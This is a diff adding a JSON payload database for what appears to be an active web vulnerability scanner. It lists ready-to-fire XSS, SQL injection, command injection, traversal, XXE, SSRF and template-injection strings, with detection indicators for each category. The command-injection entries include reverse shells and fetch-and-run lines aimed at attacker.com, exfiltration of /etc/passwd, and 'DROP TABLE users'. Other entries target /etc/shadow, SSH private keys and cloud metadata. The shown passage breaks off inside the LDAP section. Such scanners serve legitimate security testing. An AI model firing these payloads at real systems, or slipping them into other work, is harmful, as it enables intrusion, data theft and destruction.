@@ -1,0 +1,2632 @@
+{
+  "metadata": {
+    "version": "2.1.0",
+    "created": "2026-03-11",
+    "author": "Samuel - ShieldAI",
+    "description": "Payloads complets pour Active Analyzer - Encodages corrigés et mapping standardisé (version intégrale)",
+    "total_categories": 25,
+    "total_payloads": 412
+  },
+  "injection_points": {
+    "path": {
+      "description": "Injection dans le chemin de l'URL",
+      "example": "http://site.com/PATH_HERE/page",
+      "applies_to": [
+        "DirTrav",
+        "LFI",
+        "InsecPerm",
+        "IDOR",
+        "InfoDisc",
+        "CredsExpose",
+        "SSRF"
+      ]
+    },
+    "query": {
+      "description": "Injection dans les paramètres de la query string",
+      "example": "http://site.com/page?param=VALUE_HERE",
+      "applies_to": [
+        "XSS",
+        "SQLi",
+        "CMDi",
+        "NoSQLi",
+        "LDAPi",
+        "XXE",
+        "DirTrav",
+        "SSTI",
+        "OpenRedirect",
+        "SSRF",
+        "GraphQLi",
+        "XPATHi",
+        "RateLimit",
+        "JWT"
+      ]
+    },
+    "header": {
+      "description": "Injection dans les en-têtes HTTP",
+      "example": "User-Agent: VALUE_HERE",
+      "applies_to": [
+        "CMDi",
+        "SQLi",
+        "XSS",
+        "CORS",
+        "RateLimit",
+        "SessFix",
+        "CRLF_Injection",
+        "HTTP_Request_Smuggling",
+        "InsecCrypto",
+        "JWT"
+      ]
+    },
+    "form": {
+      "description": "Injection dans les données de formulaire (POST)",
+      "example": "field_name=VALUE_HERE",
+      "applies_to": [
+        "XSS",
+        "SQLi",
+        "CMDi",
+        "CSRF",
+        "InsecUpload",
+        "NoSQLi",
+        "GraphQLi",
+        "InsecDeser",
+        "XXE",
+        "BrokenAuth",
+        "RaceCondition"
+      ]
+    },
+    "cookie": {
+      "description": "Injection dans les cookies",
+      "example": "Cookie: session=VALUE_HERE",
+      "applies_to": [
+        "SQLi",
+        "XSS",
+        "SessFix",
+        "InsecDeser",
+        "JWT"
+      ]
+    },
+    "body": {
+      "description": "Injection dans le corps de la requête (JSON, XML)",
+      "example": "{\"key\": \"VALUE_HERE\"}",
+      "applies_to": [
+        "XXE",
+        "SSRF",
+        "GraphQLi",
+        "NoSQLi",
+        "InsecDeser",
+        "Prototype_Pollution"
+      ]
+    }
+  },
+  "payloads": {
+    "XSS": {
+      "name_abbr": "XSS",
+      "name_full": "cross-site_scripting",
+      "severity": "high",
+      "cvss_base": 6.1,
+      "injection_points": [
+        "query",
+        "form",
+        "header",
+        "cookie"
+      ],
+      "payloads": [
+        {
+          "payload": "<script>alert('XSS')</script>",
+          "encoding": "none",
+          "type": "basic"
+        },
+        {
+          "payload": "<img src=x onerror=alert('XSS')>",
+          "encoding": "none",
+          "type": "img_tag"
+        },
+        {
+          "payload": "<svg onload=alert('XSS')>",
+          "encoding": "none",
+          "type": "svg"
+        },
+        {
+          "payload": "<body onload=alert('XSS')>",
+          "encoding": "none",
+          "type": "body"
+        },
+        {
+          "payload": "<iframe src='javascript:alert(\"XSS\")'></iframe>",
+          "encoding": "none",
+          "type": "iframe"
+        },
+        {
+          "payload": "' onclick='alert(1)",
+          "encoding": "none",
+          "type": "attribute_breaking"
+        },
+        {
+          "payload": "\" onclick=\"alert(1)",
+          "encoding": "none",
+          "type": "attribute_breaking"
+        },
+        {
+          "payload": "'><script>alert(1)</script>",
+          "encoding": "none",
+          "type": "tag_breaking"
+        },
+        {
+          "payload": "\"><script>alert(1)</script>",
+          "encoding": "none",
+          "type": "tag_breaking"
+        },
+        {
+          "payload": "' onload='alert(1)",
+          "encoding": "none",
+          "type": "attribute_breaking"
+        },
+        {
+          "payload": "\" onerror=\"alert(1)",
+          "encoding": "none",
+          "type": "attribute_breaking"
+        },
+        {
+          "payload": "><script>alert(1)</script>",
+          "encoding": "none",
+          "type": "tag_breaking"
+        },
+        {
+          "payload": "></script><script>alert(1)</script>",
+          "encoding": "none",
+          "type": "tag_breaking"
+        },
+        {
+          "payload": "><img src=x onerror=alert(1)>",
+          "encoding": "none",
+          "type": "tag_breaking"
+        },
+        {
+          "payload": "></textarea><script>alert(1)</script>",
+          "encoding": "none",
+          "type": "tag_breaking"
+        },
+        {
+          "payload": "<input onfocus=alert(1) autofocus>",
+          "encoding": "none",
+          "type": "event_handlers"
+        },
+        {
+          "payload": "<marquee onstart=alert(1)>",
+          "encoding": "none",
+          "type": "event_handlers"
+        },
+        {
+          "payload": "<details open ontoggle=alert(1)>",
+          "encoding": "none",
+          "type": "event_handlers"
+        },
+        {
+          "payload": "<select onfocus=alert(1) autofocus>",
+          "encoding": "none",
+          "type": "event_handlers"
+        },
+        {
+          "payload": "<video><source onerror=alert(1)>",
+          "encoding": "none",
+          "type": "event_handlers"
+        },
+        {
+          "payload": "javascript:alert(1)",
+          "encoding": "none",
+          "type": "javascript_protocol"
+        },
+        {
+          "payload": "javascript:alert(String.fromCharCode(88,83,83))",
+          "encoding": "none",
+          "type": "javascript_protocol"
+        },
+        {
+          "payload": "data:text/html,<script>alert(1)</script>",
+          "encoding": "none",
+          "type": "data_uri"
+        },
+        {
+          "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+          "encoding": "none",
+          "type": "data_uri"
+        },
+        {
+          "payload": "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
+          "encoding": "none",
+          "type": "dom_based"
+        },
+        {
+          "payload": "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
+          "encoding": "none",
+          "type": "dom_based"
+        },
+        {
+          "payload": "<iframe srcdoc='<script>alert(1)</script>'>",
+          "encoding": "none",
+          "type": "dom_based"
+        },
+        {
+          "payload": "<object data='javascript:alert(1)'>",
+          "encoding": "none",
+          "type": "dom_based"
+        },
+        {
+          "payload": "<embed src='data:text/html,<script>alert(1)</script>'>",
+          "encoding": "none",
+          "type": "dom_based"
+        },
+        {
+          "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>",
+          "encoding": "none",
+          "type": "filter_bypass"
+        },
+        {
+          "payload": "<img/src=x/onerror=alert(1)>",
+          "encoding": "none",
+          "type": "filter_bypass"
+        },
+        {
+          "payload": "<svg><animate onbegin=alert(1)>",
+          "encoding": "none",
+          "type": "filter_bypass"
+        },
+        {
+          "payload": "<isindex type=image src=1 onerror=alert(1)>",
+          "encoding": "none",
+          "type": "filter_bypass"
+        },
+        {
+          "payload": "<form><button formaction=javascript:alert(1)>X",
+          "encoding": "none",
+          "type": "filter_bypass"
+        },
+        {
+          "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'",
+          "encoding": "none",
+          "type": "polyglot"
+        },
+        {
+          "payload": "'\"><img src=x onerror=alert(1)//",
+          "encoding": "none",
+          "type": "polyglot"
+        },
+        {
+          "payload": "<script>alert('XSS')</script>",
+          "encoding": "url",
+          "type": "basic_encoded"
+        },
+        {
+          "payload": "<script>alert('XSS')</script>",
+          "encoding": "html",
+          "type": "basic_encoded"
+        },
+        {
+          "payload": "<script>alert('XSS')</script>",
+          "encoding": "base64",
+          "type": "basic_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "alert('XSS')</script>",
+          "onerror=alert(1)",
+          "onload=alert('XSS')",
+          "onload=alert(1)",
+          "onfocus=alert(1)",
+          "onstart=alert(1)",
+          "ontoggle=alert(1)",
+          "<svg onload=alert",
+          "<img src=x onerror=alert",
+          "javascript:alert(1)",
+          "eval(atob('YWxlcnQoMSk='))",
+          "fromCharCode(88,83,83)",
+          "formaction=javascript:alert"
+        ],
+        "delay_based": false
+      }
+    },
+    "SQLi": {
+      "name_abbr": "SQLi",
+      "name_full": "sql_injection",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "query",
+        "form",
+        "header",
+        "cookie"
+      ],
+      "payloads": [
+        {
+          "payload": "' OR '1'='1",
+          "encoding": "none",
+          "type": "basic_or"
+        },
+        {
+          "payload": "' OR 1=1--",
+          "encoding": "none",
+          "type": "basic_or"
+        },
+        {
+          "payload": "' OR 1=1#",
+          "encoding": "none",
+          "type": "basic_or"
+        },
+        {
+          "payload": "' OR 1=1/*",
+          "encoding": "none",
+          "type": "basic_or"
+        },
+        {
+          "payload": "admin' --",
+          "encoding": "none",
+          "type": "basic_or"
+        },
+        {
+          "payload": "admin' #",
+          "encoding": "none",
+          "type": "basic_or"
+        },
+        {
+          "payload": "admin'/*",
+          "encoding": "none",
+          "type": "basic_or"
+        },
+        {
+          "payload": "' UNION SELECT NULL--",
+          "encoding": "none",
+          "type": "union_based"
+        },
+        {
+          "payload": "' UNION SELECT NULL,NULL--",
+          "encoding": "none",
+          "type": "union_based"
+        },
+        {
+          "payload": "' UNION SELECT NULL,NULL,NULL--",
+          "encoding": "none",
+          "type": "union_based"
+        },
+        {
+          "payload": "' UNION ALL SELECT NULL,NULL,NULL--",
+          "encoding": "none",
+          "type": "union_based"
+        },
+        {
+          "payload": "1' UNION SELECT @@version--",
+          "encoding": "none",
+          "type": "union_based"
+        },
+        {
+          "payload": "' AND 1=CONVERT(int, @@version)--",
+          "encoding": "none",
+          "type": "error_based"
+        },
+        {
+          "payload": "' AND extractvalue(1,concat(0x7e,database()))--",
+          "encoding": "none",
+          "type": "error_based"
+        },
+        {
+          "payload": "' AND updatexml(1,concat(0x7e,user()),1)--",
+          "encoding": "none",
+          "type": "error_based"
+        },
+        {
+          "payload": "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)--",
+          "encoding": "none",
+          "type": "error_based"
+        },
+        {
+          "payload": "' AND SLEEP(5)--",
+          "encoding": "none",
+          "type": "time_based"
+        },
+        {
+          "payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+          "encoding": "none",
+          "type": "time_based"
+        },
+        {
+          "payload": "1' AND IF(1=1, SLEEP(5), 0)--",
+          "encoding": "none",
+          "type": "time_based"
+        },
+        {
+          "payload": "' OR IF(SUBSTRING(user(),1,1)='r',SLEEP(5),0)--",
+          "encoding": "none",
+          "type": "time_based"
+        },
+        {
+          "payload": "'; WAITFOR DELAY '00:00:05'--",
+          "encoding": "none",
+          "type": "time_based"
+        },
+        {
+          "payload": "' AND pg_sleep(5)--",
+          "encoding": "none",
+          "type": "time_based"
+        },
+        {
+          "payload": "' AND 1=1--",
+          "encoding": "none",
+          "type": "boolean_based"
+        },
+        {
+          "payload": "' AND 1=2--",
+          "encoding": "none",
+          "type": "boolean_based"
+        },
+        {
+          "payload": "' AND SUBSTRING(user(),1,1)='a'--",
+          "encoding": "none",
+          "type": "boolean_based"
+        },
+        {
+          "payload": "'; DROP TABLE users--",
+          "encoding": "none",
+          "type": "stacked_queries"
+        },
+        {
+          "payload": "'; CREATE TABLE test(id int)--",
+          "encoding": "none",
+          "type": "stacked_queries"
+        },
+        {
+          "payload": "'; EXEC xp_dirtree '\\\\attacker.com\\share'--",
+          "encoding": "none",
+          "type": "out_of_band"
+        },
+        {
+          "payload": "' /**/OR/**/1=1--",
+          "encoding": "none",
+          "type": "bypass_waf"
+        },
+        {
+          "payload": "' /*!50000OR*/1=1--",
+          "encoding": "none",
+          "type": "bypass_waf"
+        },
+        {
+          "payload": "' OR 1=1%23",
+          "encoding": "none",
+          "type": "bypass_waf"
+        },
+        {
+          "payload": "' %6f%72 1=1--",
+          "encoding": "none",
+          "type": "bypass_waf"
+        },
+        {
+          "payload": "' OR 'a'='a",
+          "encoding": "none",
+          "type": "bypass_waf"
+        },
+        {
+          "payload": "' /*!12345UNION*/ SELECT--",
+          "encoding": "none",
+          "type": "bypass_waf"
+        },
+        {
+          "payload": "' OR '1'='1",
+          "encoding": "url",
+          "type": "basic_encoded"
+        },
+        {
+          "payload": "' OR 1=1--",
+          "encoding": "url",
+          "type": "basic_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "You have an error in your SQL syntax",
+          "check the manual that corresponds to your MySQL server version",
+          "SQLSTATE[42000]: Syntax error or access violation",
+          "mysql_fetch_array() expects parameter",
+          "mysql_fetch_row() expects parameter",
+          "supplied argument is not a valid MySQL",
+          "ORA-00933: SQL command not properly ended",
+          "ORA-01756: quoted string not properly terminated",
+          "ORA-00907: missing right parenthesis",
+          "ORA-01789: query block has incorrect number of result columns",
+          "PostgreSQL ERROR: syntax error at or near",
+          "ERROR: unterminated quoted string at or near",
+          "pg_query(): Query failed",
+          "ERROR: invalid input syntax for",
+          "Unclosed quotation mark after the character string",
+          "Microsoft OLE DB Provider for SQL Server error",
+          "Incorrect syntax near",
+          "ODBC SQL Server Driver",
+          "SQLite3::query(): Unable to prepare statement",
+          "SQLITE_ERROR: near",
+          "DB2 SQL error: SQLCODE",
+          "Warning: sqlite_",
+          "Warning: pg_",
+          "Warning: mysql_",
+          "mysqli_fetch_array() expects parameter",
+          "Division by zero",
+          "java.sql.SQLException"
+        ],
+        "delay_based": true,
+        "min_delay_seconds": 5
+      }
+    },
+    "CMDi": {
+      "name_abbr": "CMDi",
+      "name_full": "command_injection",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "query",
+        "form",
+        "header"
+      ],
+      "payloads": [
+        {
+          "payload": "; id",
+          "encoding": "none",
+          "type": "unix_basic"
+        },
+        {
+          "payload": "| whoami",
+          "encoding": "none",
+          "type": "unix_basic"
+        },
+        {
+          "payload": "`whoami`",
+          "encoding": "none",
+          "type": "unix_basic"
+        },
+        {
+          "payload": "$(whoami)",
+          "encoding": "none",
+          "type": "unix_basic"
+        },
+        {
+          "payload": "; cat /etc/passwd",
+          "encoding": "none",
+          "type": "unix_basic"
+        },
+        {
+          "payload": "| cat /etc/passwd",
+          "encoding": "none",
+          "type": "unix_basic"
+        },
+        {
+          "payload": "; ls -la",
+          "encoding": "none",
+          "type": "unix_basic"
+        },
+        {
+          "payload": "| pwd",
+          "encoding": "none",
+          "type": "unix_basic"
+        },
+        {
+          "payload": "&& whoami",
+          "encoding": "none",
+          "type": "unix_chained"
+        },
+        {
+          "payload": "|| whoami",
+          "encoding": "none",
+          "type": "unix_chained"
+        },
+        {
+          "payload": "; whoami; pwd",
+          "encoding": "none",
+          "type": "unix_chained"
+        },
+        {
+          "payload": "| whoami | pwd",
+          "encoding": "none",
+          "type": "unix_chained"
+        },
+        {
+          "payload": "| dir",
+          "encoding": "none",
+          "type": "windows_basic"
+        },
+        {
+          "payload": "& dir",
+          "encoding": "none",
+          "type": "windows_basic"
+        },
+        {
+          "payload": "; net user",
+          "encoding": "none",
+          "type": "windows_basic"
+        },
+        {
+          "payload": "| whoami",
+          "encoding": "none",
+          "type": "windows_basic"
+        },
+        {
+          "payload": "& ipconfig",
+          "encoding": "none",
+          "type": "windows_basic"
+        },
+        {
+          "payload": "; systeminfo",
+          "encoding": "none",
+          "type": "windows_basic"
+        },
+        {
+          "payload": "; nc attacker.com 4444 -e /bin/sh",
+          "encoding": "none",
+          "type": "reverse_shell"
+        },
+        {
+          "payload": "| bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+          "encoding": "none",
+          "type": "reverse_shell"
+        },
+        {
+          "payload": "; curl http://attacker.com/shell.sh | sh",
+          "encoding": "none",
+          "type": "reverse_shell"
+        },
+        {
+          "payload": "| wget http://attacker.com/shell.sh -O /tmp/s.sh && sh /tmp/s.sh",
+          "encoding": "none",
+          "type": "reverse_shell"
+        },
+        {
+          "payload": "; sleep 5",
+          "encoding": "none",
+          "type": "blind_detection"
+        },
+        {
+          "payload": "| sleep 5",
+          "encoding": "none",
+          "type": "blind_detection"
+        },
+        {
+          "payload": "& timeout 5",
+          "encoding": "none",
+          "type": "blind_detection"
+        },
+        {
+          "payload": "; ping -c 5 127.0.0.1",
+          "encoding": "none",
+          "type": "blind_detection"
+        },
+        {
+          "payload": "; curl http://attacker.com/?data=$(cat /etc/passwd | base64)",
+          "encoding": "none",
+          "type": "data_exfiltration"
+        },
+        {
+          "payload": "| wget --post-data=\"data=$(whoami)\" http://attacker.com",
+          "encoding": "none",
+          "type": "data_exfiltration"
+        },
+        {
+          "payload": ";w''hoami",
+          "encoding": "none",
+          "type": "bypass_filters"
+        },
+        {
+          "payload": ";who$()ami",
+          "encoding": "none",
+          "type": "bypass_filters"
+        },
+        {
+          "payload": ";w\\ho\\am\\i",
+          "encoding": "none",
+          "type": "bypass_filters"
+        },
+        {
+          "payload": ";/bin/w''hoami",
+          "encoding": "none",
+          "type": "bypass_filters"
+        },
+        {
+          "payload": ";`echo whoami`",
+          "encoding": "none",
+          "type": "bypass_filters"
+        },
+        {
+          "payload": "; id",
+          "encoding": "url",
+          "type": "semicolon_encoded"
+        },
+        {
+          "payload": "; id",
+          "encoding": "base64",
+          "type": "semicolon_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "uid=0(root)",
+          "uid=33(www-data)",
+          "uid=1000(",
+          "gid=0(root)",
+          "gid=33(www-data)",
+          "root:x:0:0:root:/root:/bin/bash",
+          "daemon:x:1:1:daemon",
+          "/bin/bash",
+          "/bin/sh",
+          "sh: 1: id: not found",
+          "bash: id: command not found",
+          "Windows IP Configuration",
+          "Ethernet adapter",
+          "Volume Serial Number is",
+          " Directory of C:\\",
+          "drwxr-xr-x",
+          "drwxrwxrwt",
+          "total 0",
+          "total 4",
+          "total 8"
+        ],
+        "delay_based": true,
+        "min_delay_seconds": 5
+      }
+    },
+    "DirTrav": {
+      "name_abbr": "DirTrav",
+      "name_full": "directory_traversal",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "path",
+        "query",
+        "form"
+      ],
+      "payloads": [
+        {
+          "payload": "../../../etc/passwd",
+          "encoding": "none",
+          "type": "unix_basic"
+        },
+        {
+          "payload": "../../../../etc/passwd",
+          "encoding": "none",
+          "type": "unix_basic"
+        },
+        {
+          "payload": "../../../../../etc/passwd",
+          "encoding": "none",
+          "type": "unix_basic"
+        },
+        {
+          "payload": "../../../etc/shadow",
+          "encoding": "none",
+          "type": "unix_basic"
+        },
+        {
+          "payload": "../../../etc/hosts",
+          "encoding": "none",
+          "type": "unix_basic"
+        },
+        {
+          "payload": "../../../root/.ssh/id_rsa",
+          "encoding": "none",
+          "type": "unix_basic"
+        },
+        {
+          "payload": "..\\..\\..\\windows\\win.ini",
+          "encoding": "none",
+          "type": "windows_basic"
+        },
+        {
+          "payload": "..\\..\\..\\..\\windows\\system32\\config\\sam",
+          "encoding": "none",
+          "type": "windows_basic"
+        },
+        {
+          "payload": "..\\..\\..\\boot.ini",
+          "encoding": "none",
+          "type": "windows_basic"
+        },
+        {
+          "payload": "/etc/passwd",
+          "encoding": "none",
+          "type": "absolute_paths"
+        },
+        {
+          "payload": "/etc/shadow",
+          "encoding": "none",
+          "type": "absolute_paths"
+        },
+        {
+          "payload": "C:\\windows\\win.ini",
+          "encoding": "none",
+          "type": "absolute_paths"
+        },
+        {
+          "payload": "../../../etc/passwd",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "../../../etc/passwd",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "..\\..\\..\\windows\\win.ini",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "../../etc/passwd",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "../../../etc/passwd",
+          "encoding": "null_bytes",
+          "type": "null_byte"
+        },
+        {
+          "payload": "file:///etc/passwd",
+          "encoding": "none",
+          "type": "file_protocols"
+        },
+        {
+          "payload": "php://filter/convert.base64-encode/resource=index.php",
+          "encoding": "none",
+          "type": "php_wrappers"
+        },
+        {
+          "payload": "php://filter/read=string.rot13/resource=config.php",
+          "encoding": "none",
+          "type": "php_wrappers"
+        },
+        {
+          "payload": "php://input",
+          "encoding": "none",
+          "type": "php_wrappers"
+        },
+        {
+          "payload": "expect://whoami",
+          "encoding": "none",
+          "type": "php_wrappers"
+        },
+        {
+          "payload": "....//....//....//etc/passwd",
+          "encoding": "none",
+          "type": "bypass_filters"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "root:x:0:0:root:/root:/bin/bash",
+          "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
+          "nobody:x:65534:",
+          "www-data:x:33:",
+          "[extensions]",
+          "[fonts]",
+          "[Mail]",
+          "for 16-bit app support",
+          "BEGIN RSA PRIVATE KEY",
+          "BEGIN OPENSSH PRIVATE KEY",
+          "DB_PASSWORD",
+          "<?php"
+        ],
+        "delay_based": false
+      }
+    },
+    "XXE": {
+      "name_abbr": "XXE",
+      "name_full": "xml_external_entity",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "form",
+        "body"
+      ],
+      "payloads": [
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+          "encoding": "none",
+          "type": "basic_file_read"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
+          "encoding": "none",
+          "type": "basic_file_read"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
+          "encoding": "none",
+          "type": "basic_file_read"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+          "encoding": "none",
+          "type": "php_expect"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
+          "encoding": "none",
+          "type": "php_filter"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://internal-server/admin\">]><foo>&xxe;</foo>",
+          "encoding": "none",
+          "type": "ssrf"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+          "encoding": "none",
+          "type": "ssrf"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]><foo>&send;</foo>",
+          "encoding": "none",
+          "type": "parameter_entities"
+        },
+        {
+          "payload": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"><!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">]><lolz>&lol4;</lolz>",
+          "encoding": "none",
+          "type": "billion_laughs"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "root:x:0:0:root:/root:/bin/bash",
+          "daemon:x:1:1:",
+          "[extensions]",
+          "[fonts]",
+          "for 16-bit app support",
+          "XML parsing error",
+          "SAXParseException",
+          "lxml.etree.XMLSyntaxError",
+          "org.xml.sax.SAXParseException",
+          "javax.xml.parsers.ParserConfigurationException"
+        ],
+        "delay_based": false
+      }
+    },
+    "SSRF": {
+      "name_abbr": "SSRF",
+      "name_full": "server_side_request_forgery",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "query",
+        "form",
+        "body",
+        "header"
+      ],
+      "payloads": [
+        {
+          "payload": "http://127.0.0.1/admin",
+          "encoding": "none",
+          "type": "internal_networks"
+        },
+        {
+          "payload": "http://localhost/admin",
+          "encoding": "none",
+          "type": "internal_networks"
+        },
+        {
+          "payload": "http://0.0.0.0/admin",
+          "encoding": "none",
+          "type": "internal_networks"
+        },
+        {
+          "payload": "http://192.168.1.1/",
+          "encoding": "none",
+          "type": "internal_networks"
+        },
+        {
+          "payload": "http://10.0.0.1/",
+          "encoding": "none",
+          "type": "internal_networks"
+        },
+        {
+          "payload": "http://169.254.169.254/latest/meta-data/",
+          "encoding": "none",
+          "type": "cloud_metadata"
+        },
+        {
+          "payload": "http://169.254.169.254/latest/user-data/",
+          "encoding": "none",
+          "type": "cloud_metadata"
+        },
+        {
+          "payload": "http://metadata.google.internal/computeMetadata/v1/",
+          "encoding": "none",
+          "type": "cloud_metadata"
+        },
+        {
+          "payload": "file:///etc/passwd",
+          "encoding": "none",
+          "type": "protocol_bypass"
+        },
+        {
+          "payload": "gopher://127.0.0.1:25/xHELO",
+          "encoding": "none",
+          "type": "protocol_bypass"
+        },
+        {
+          "payload": "dict://127.0.0.1:11211/stat",
+          "encoding": "none",
+          "type": "protocol_bypass"
+        },
+        {
+          "payload": "ftp://internal-server/file.txt",
+          "encoding": "none",
+          "type": "protocol_bypass"
+        },
+        {
+          "payload": "http://127.1/admin",
+          "encoding": "none",
+          "type": "bypass_filters"
+        },
+        {
+          "payload": "http://2130706433/admin",
+          "encoding": "none",
+          "type": "bypass_filters"
+        },
+        {
+          "payload": "http://0x7f000001/admin",
+          "encoding": "none",
+          "type": "bypass_filters"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "ami-id",
+          "instance-id",
+          "local-ipv4",
+          "iam/security-credentials",
+          "computeMetadata",
+          "google/compute/v1",
+          "root:x:0:0:root:/root:/bin/bash",
+          "169.254.169.254",
+          "Connection refused",
+          "SSRF successful"
+        ],
+        "delay_based": true
+      }
+    },
+    "SSTI": {
+      "name_abbr": "SSTI",
+      "name_full": "server_side_template_injection",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "query",
+        "form",
+        "header"
+      ],
+      "payloads": [
+        {
+          "payload": "{{7*7}}",
+          "encoding": "none",
+          "type": "jinja2"
+        },
+        {
+          "payload": "{{config}}",
+          "encoding": "none",
+          "type": "jinja2"
+        },
+        {
+          "payload": "{{config.items()}}",
+          "encoding": "none",
+          "type": "jinja2"
+        },
+        {
+          "payload": "{{''.__class__.__mro__[2].__subclasses__()}}",
+          "encoding": "none",
+          "type": "jinja2"
+        },
+        {
+          "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+          "encoding": "none",
+          "type": "jinja2"
+        },
+        {
+          "payload": "{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c()._module.__builtins__['__import__']('os').system('whoami')}}{%endif%}{%endfor%}",
+          "encoding": "none",
+          "type": "jinja2"
+        },
+        {
+          "payload": "{{7*'7'}}",
+          "encoding": "none",
+          "type": "twig"
+        },
+        {
+          "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+          "encoding": "none",
+          "type": "twig"
+        },
+        {
+          "payload": "${7*7}",
+          "encoding": "none",
+          "type": "freemarker"
+        },
+        {
+          "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }",
+          "encoding": "none",
+          "type": "freemarker"
+        },
+        {
+          "payload": "#set($x='')##$x.class.forName('java.lang.Runtime').getRuntime().exec('id')",
+          "encoding": "none",
+          "type": "velocity"
+        },
+        {
+          "payload": "{system('id')}",
+          "encoding": "none",
+          "type": "smarty"
+        },
+        {
+          "payload": "{php}echo `id`;{/php}",
+          "encoding": "none",
+          "type": "smarty"
+        },
+        {
+          "payload": "<%= 7*7 %>",
+          "encoding": "none",
+          "type": "erb"
+        },
+        {
+          "payload": "<%= system('id') %>",
+          "encoding": "none",
+          "type": "erb"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "49",
+          "7777777",
+          "uid=0(root)",
+          "uid=33(www-data)",
+          "jinja2.exceptions.UndefinedError",
+          "jinja2.exceptions.TemplateSyntaxError",
+          "TemplateSyntaxError",
+          "Smarty error:",
+          "FreeMarker template error",
+          "freemarker.core.ParseException"
+        ],
+        "delay_based": false
+      }
+    },
+    "NoSQLi": {
+      "name_abbr": "NoSQLi",
+      "name_full": "nosql_injection",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "query",
+        "form",
+        "body"
+      ],
+      "payloads": [
+        {
+          "payload": "{\"$ne\": null}",
+          "encoding": "none",
+          "type": "mongodb"
+        },
+        {
+          "payload": "{\"$ne\": \"\"}",
+          "encoding": "none",
+          "type": "mongodb"
+        },
+        {
+          "payload": "{\"$gt\": \"\"}",
+          "encoding": "none",
+          "type": "mongodb"
+        },
+        {
+          "payload": "{\"$regex\": \".*\"}",
+          "encoding": "none",
+          "type": "mongodb"
+        },
+        {
+          "payload": "{\"$where\": \"1==1\"}",
+          "encoding": "none",
+          "type": "mongodb"
+        },
+        {
+          "payload": "{\"$or\": [{}, {\"a\":\"a\"}]}",
+          "encoding": "none",
+          "type": "mongodb"
+        },
+        {
+          "payload": "' || '1'=='1",
+          "encoding": "none",
+          "type": "json_injection"
+        },
+        {
+          "payload": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+          "encoding": "none",
+          "type": "json_injection"
+        },
+        {
+          "payload": "{\"username\": {\"$regex\": \"^admin\"}, \"password\": {\"$ne\": null}}",
+          "encoding": "none",
+          "type": "json_injection"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          "MongoError:",
+          "MongoServerError:",
+          "CastError: Cast to ObjectId failed",
+          "BSONTypeError:",
+          "ValidationError:",
+          "unknown operator: $",
+          "Unrecognized expression",
+          "$where is not allowed"
+        ],
+        "delay_based": false
+      }
+    },
+    "LDAPi": {
+      "name_abbr": "LDAPi",
+      "name_full": "ldap_injection",
